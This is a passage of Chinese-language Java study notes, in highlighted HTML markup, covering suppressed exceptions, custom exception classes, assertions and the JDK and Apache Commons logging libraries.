&lt;li>如果在finally中抛出异常（尽量别），由于&lt;code>catch&lt;/code>中准备抛出的异常就“消失”了，所以这个没有被抛出的异常称为“被屏蔽”的异常Suppressed Exception&lt;/li>
&lt;li>如果我们需要获知所有的异常，可以先用&lt;code>origin&lt;/code>变量保存原始异常，然后调用&lt;code>Throwable.addSuppressed()&lt;/code>，把原始异常添加进来，最后在&lt;code>finally&lt;/code>抛出&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parseInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;abc&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addSuppressed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当&lt;code>catch&lt;/code>和&lt;code>finally&lt;/code>都抛出了异常时，虽然&lt;code>catch&lt;/code>的异常被屏蔽了，但是，&lt;code>finally&lt;/code>抛出的异常仍然包含了它：&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;main&amp;#34; java.lang.IllegalArgumentException
at Main.main(Main.java:11)
Suppressed: java.lang.NumberFormatException: For input string: &amp;#34;abc&amp;#34;
at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
at java.base/java.lang.Integer.parseInt(Integer.java:652)
at java.base/java.lang.Integer.parseInt(Integer.java:770)
at Main.main(Main.java:6)
&lt;/code>&lt;/pre>&lt;p>通过&lt;code>Throwable.getSuppressed()&lt;/code>可以获取所有的&lt;code>Suppressed Exception&lt;/code>&lt;/p>
&lt;h3 id="自定义异常">自定义异常&lt;/h3>
&lt;ul>
&lt;li>见的做法是自定义一个&lt;code>BaseException&lt;/code>作为“根异常”，然后，派生出各种业务类型的异常；&lt;code>BaseException&lt;/code>需要从一个适合的&lt;code>Exception&lt;/code>派生，通常建议从&lt;code>RuntimeException&lt;/code>派生&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">UserNotFoundException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">LoginFailedException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>自定义的&lt;code>BaseException&lt;/code>应该提供多个构造方法&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样，抛出异常的时候，就可以选择合适的构造方法&lt;/p>
&lt;h3 id="断言">断言&lt;/h3>
&lt;ul>
&lt;li>JVM默认关闭断言指令，需传入&lt;code>-enableassertions&lt;/code>或&lt;code>-ea&lt;/code>；还可以有选择地对特定地类启用断言，命令行参数是：&lt;code>-ea:com.itranswarp.sample.Main&lt;/code>，表示只对&lt;code>com.itranswarp.sample.Main&lt;/code>这个类启用断言；或者对特定地包启用断言，命令行参数是：&lt;code>-ea:com.itranswarp.sample...&lt;/code>（注意结尾有3个&lt;code>.&lt;/code>），表示对&lt;code>com.itranswarp.sample&lt;/code>这个包启动断言&lt;/li>
&lt;li>是一种调试方式，失败时会抛出&lt;code>AssertionError&lt;/code>，导致程序结束退出&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">abs&lt;/span>&lt;span style="color:#f92672">(-&lt;/span>&lt;span style="color:#ae81ff">123.45&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;x must &amp;gt;= 0&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 会带上消息
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>不能用于可恢复的程序错误，只应该用于开发和测试阶段，对于可恢复的程序错误，不应该使用断言&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>应该直接捕获了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;array cannot be null&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="日志">日志&lt;/h2>
&lt;p>为了取代&lt;code>System.out.println()&lt;/code>，封装好了很多好用的方法&lt;/p>
&lt;h3 id="jdk-logging">JDK Logging&lt;/h3>
&lt;p>标准库自带&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Level&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Logger&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Logger&lt;/span> &lt;span style="color:#111">logger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getGlobal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start process...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;memory is running out...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">fine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ignored.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">severe&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process will be terminated...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>JDK的Logging定义了7个日志级别，从严重到普通&lt;/li>
&lt;/ul>
&lt;p>SEVERE, WARNING, INFO(default), CONFIG, FINE, FINER, FINEST&lt;/p>
&lt;ul>
&lt;li>局限：配置不太方便，需要在JVM启动时传递参数&lt;code>-Djava.util.logging.config.file=&amp;lt;config-file-name&amp;gt;&lt;/code>，一旦开始运行&lt;code>main()&lt;/code>方法，就无法修改配置&lt;/li>
&lt;/ul>
&lt;h3 id="commons-logging">Commons Logging&lt;/h3>
&lt;p>第三方，由Apache创建，可以挂接不同的日志系统，并通过配置文件指定挂接的日志系统&lt;/p>
&lt;p>可作为日志接口，而非日志实现&lt;/p>
&lt;ul>
&lt;li>默认搜索Log4j，没有的话用JDK Logging&lt;/li>
&lt;li>使用很简单&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.Log&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.LogFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 打印日志
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;end.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>6个日志级别&lt;/li>
&lt;/ul>
&lt;p>FATAL, ERROR, WARNING, INFO(default), DEBUG, TRACE&lt;/p>
&lt;ul>
&lt;li>除&lt;code>info(String)&lt;/code>外还有&lt;code>info(String, Throwable)&lt;/code>这样一个重载方法，便于更简单地记录异常&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">log&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;got exception!&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果在静态方法中引用&lt;code>Log&lt;/code>，通常直接定义一个静态类型变量：&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 在静态方法中引用Log:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Log&lt;/span> &lt;span style="color:#111">log&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LogFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLog&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
